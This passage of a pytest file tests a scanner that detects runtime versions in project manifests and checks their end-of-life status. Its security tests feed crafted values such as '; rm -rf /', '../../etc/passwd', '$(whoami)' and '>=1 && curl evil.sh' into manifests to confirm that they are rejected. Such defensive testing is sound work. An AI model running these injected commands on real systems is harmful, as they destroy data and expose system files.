    assert "supported" in rendered
    assert "support status unknown" in rendered
    as_dict = scan.to_dict()
    assert as_dict["statuses"][0]["runtime"]["product"] in {"nodejs", "python", "dotnet"}


def test_scan_eol_reports_statuses_for_ruby_and_go():
    ws = InMemoryWorkspace(
        {
            ".ruby-version": "3.2.0",
            "go.mod": "module example.com/foo\n\ngo 1.21.3\n",
            "global.json": json.dumps({"sdk": {"version": "8.0.100"}}),
        }
    )

    def fetch(product):
        if product == "ruby":
            return [{"cycle": "3.2", "eol": _PAST_EOL}]
        if product == "go":
            return [{"cycle": "1.21", "eol": _FUTURE_EOL}]
        return [{"cycle": "6.0", "eol": _FUTURE_EOL}]  # dotnet: no cycle "8.0"

    scan = scan_eol(ws, fetch=fetch)
    assert scan.queried is True
    assert scan.error is None
    by_product = {s.runtime.product: s for s in scan.statuses}
    assert by_product["ruby"].end_of_life is True
    assert by_product["ruby"].eol_date == _PAST_EOL
    assert by_product["go"].end_of_life is False
    assert by_product["go"].eol_date == _FUTURE_EOL
    assert by_product["dotnet"].end_of_life == "unknown"
    rendered = scan.render()
    assert "Ruby 3.2.0" in rendered
    assert "Go 1.21.3" in rendered
    assert "END OF LIFE" in rendered


def test_scan_eol_reports_statuses_for_php():
    ws = InMemoryWorkspace(
        {
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
            ".ruby-version": "9.9.9",  # unresolvable cycle -> "unknown" branch
        }
    )

    def fetch(product):
        if product == "php":
            return [{"cycle": "8.1", "eol": _PAST_EOL}]
        if product == "go":
            return [{"cycle": "1.21", "eol": _FUTURE_EOL}]
        return [{"cycle": "3.2", "eol": _FUTURE_EOL}]  # no cycle "9" -> unmatched

    scan = scan_eol(ws, fetch=fetch)
    assert scan.queried is True
    assert scan.error is None
    by_product = {s.runtime.product: s for s in scan.statuses}
    assert by_product["php"].end_of_life is True
    assert by_product["php"].eol_date == _PAST_EOL
    assert by_product["go"].end_of_life is False
    assert by_product["ruby"].end_of_life == "unknown"
    rendered = scan.render()
    assert "PHP 8.1" in rendered
    assert "END OF LIFE" in rendered
    assert "supported" in rendered
    assert "support status unknown" in rendered


@pytest.mark.parametrize(
    "manifest,contents,product",
    [
        (".nvmrc", "18.17.0", "nodejs"),
        (
            "composer.json",
            json.dumps({"require": {"php": "^8.1"}}),
            "php",
        ),
    ],
)
def test_scan_eol_degrades_on_fetch_failure(manifest, contents, product):
    ws = InMemoryWorkspace({manifest: contents})

    def broken_fetch(_product):
        raise OSError("network down")

    scan = scan_eol(ws, fetch=broken_fetch)
    assert scan.queried is False
    assert "network down" in scan.error
    assert scan.statuses == [EolStatus(scan.runtimes[0], "unknown", None)]
    assert scan.runtimes[0].product == product
    assert "unavailable" in scan.render()


@pytest.mark.parametrize(
    "manifest,contents,malformed_product",
    [
        (".nvmrc", "18.17.0", "nodejs"),
        (
            "composer.json",
            json.dumps({"require": {"php": "^8.1"}}),
            "php",
        ),
    ],
)
def test_scan_eol_degrades_on_malformed_response(manifest, contents, malformed_product):
    ws = InMemoryWorkspace(
        {manifest: contents, "global.json": json.dumps({"sdk": {"version": "8.0.0"}})}
    )

    def fetch(product):
        if product == malformed_product:
            return {"unexpected": "shape"}  # not a list
        return [{"cycle": "18", "eol": _PAST_EOL}]

    scan = scan_eol(ws, fetch=fetch)
    # One product's malformed response invalidates the whole batch: nothing
    # is published half-resolved, mirroring depscan's atomic degrade.
    assert scan.queried is False
    assert scan.error is not None
    assert all(status.end_of_life == "unknown" for status in scan.statuses)
    assert len(scan.statuses) == 2


def test_scan_eol_disabled_skips_network_entirely():
    ws = InMemoryWorkspace({".nvmrc": "18.17.0"})
    calls = []

    def fetch(product):
        calls.append(product)
        return []

    scan = scan_eol(ws, fetch=fetch, enabled=False)
    assert scan.queried is False
    assert scan.error == "scan disabled"
    assert scan.statuses == [EolStatus(scan.runtimes[0], "unknown", None)]
    assert calls == []
    assert "scan disabled" in scan.render()


def test_scan_eol_empty_workspace_never_queries():
    calls = []

    def fetch(product):
        calls.append(product)
        return []

    scan = scan_eol(InMemoryWorkspace({"README.md": "hi"}), fetch=fetch)
    assert scan.runtimes == []
    assert scan.queried is False
    assert calls == []
    assert scan.render() == ""


def test_scan_eol_at_most_one_request_per_distinct_product():
    # .nvmrc and package.json agree on nodejs; .python-version adds a second
    # distinct product. Total requests must be 2, not 3 — one per matched
    # file would over-count the agreeing nodejs pair.
    ws = InMemoryWorkspace(
        {
            ".nvmrc": "18.17.0",
            "package.json": json.dumps({"engines": {"node": "18.17.0"}}),
            ".python-version": "3.11.4",
        }
    )
    calls = []

    def fetch(product):
        calls.append(product)
        return [{"cycle": "18", "eol": _FUTURE_EOL}, {"cycle": "3.11", "eol": _FUTURE_EOL}]

    scan = scan_eol(ws, fetch=fetch)
    assert scan.queried is True
    assert sorted(calls) == ["nodejs", "python"]


def test_eol_scan_render_without_runtimes_is_empty():
    assert EolScan().render() == ""


# --- security: crafted version strings never reach subprocess/fs/false-match ------


def test_crafted_version_strings_degrade_to_unknown_not_a_false_match():
    malicious = ["; rm -rf /", "../../etc/passwd", "$(whoami)", "`id`"]
    cycles = [{"cycle": "18", "eol": _PAST_EOL}, {"cycle": "3.11", "eol": _FUTURE_EOL}]
    for version in malicious:
        assert _match_cycle(version, cycles) is None
        assert query_eol("nodejs", version, fetch=lambda _p: cycles) == (
            "unknown",
            None,
        )


def test_crafted_ruby_version_and_go_mod_content_never_parses_to_a_version():
    malicious = ["; rm -rf /", "../../etc/passwd", "$(whoami)", "`id`"]
    for content in malicious:
        assert parse_ruby_version(content) is None
        assert parse_go_mod(f"module x\n\ngo {content}\n") is None


def test_crafted_composer_json_php_value_never_parses_to_a_version():
    malicious = ["$(rm -rf /)", "../../etc/passwd", "; rm -rf /", "`id`"]
    for spec in malicious:
        text = json.dumps({"require": {"php": spec}})
        assert parse_composer_json_php(text) is None


def test_crafted_manifest_content_causes_no_subprocess_or_filesystem_writes(
    monkeypatch,
):
    def _boom(*_args, **_kwargs):
        raise AssertionError("eolscan must never invoke a subprocess")

    monkeypatch.setattr(subprocess, "run", _boom)
    monkeypatch.setattr(subprocess, "Popen", _boom)
    monkeypatch.setattr(os, "system", _boom)

    ws = InMemoryWorkspace(
        {
            ".nvmrc": "1.0.0; rm -rf /",
            ".python-version": "../../etc/passwd",
            "global.json": json.dumps({"sdk": {"version": "$(whoami)"}}),
            "runtime.txt": "python-`id`",
            "package.json": json.dumps({"engines": {"node": ">=1 && curl evil.sh"}}),
            ".ruby-version": "; rm -rf /",
            "go.mod": "module x\n\ngo $(whoami)\n",
            "composer.json": json.dumps({"require": {"php": "$(whoami)"}}),
        }
    )
    monkeypatch.setattr(ws, "write_text", _boom)
    scan = scan_eol(
        ws,
        fetch=lambda _p: [{"cycle": "1", "eol": _PAST_EOL}, {"cycle": "1.0", "eol": _PAST_EOL}],
    )
    # None of these crash, and the module never touched subprocess/os.system
    # or wrote to the workspace — verified by the monkeypatched raisers above.
    assert isinstance(scan, EolScan)


# --- security: no credential/env-var reads --------------------------------------


def test_no_credential_or_env_var_reads(monkeypatch):
    monkeypatch.setattr(os, "environ", {})
    ws = InMemoryWorkspace(
        {".nvmrc": "18.17.0", "global.json": json.dumps({"sdk": {"version": "8.0.0"}})}
    )
    runtimes = detect_runtimes(ws)
    assert len(runtimes) == 2
    end_of_life, eol_date = query_eol(
        "nodejs", "18.17.0", fetch=lambda _p: [{"cycle": "18", "eol": _PAST_EOL}]
    )
    assert (end_of_life, eol_date) == (True, _PAST_EOL)


# --- _http_fetch: the default network call ---------------------------------------


def test_http_fetch_gets_product_endpoint(monkeypatch):
    import urllib.request

    captured = {}

    class _Response:
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def read(self):
            return b'[{"cycle": "18", "eol": false}]'

    def fake_urlopen(request, timeout=None):
        captured["url"] = request.full_url
        captured["timeout"] = timeout
        return _Response()

    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen)
    result = _http_fetch("nodejs")
    assert result == [{"cycle": "18", "eol": False}]
    assert captured["url"] == "https://endoflife.date/api/nodejs.json"
    assert captured["timeout"] == 30.0
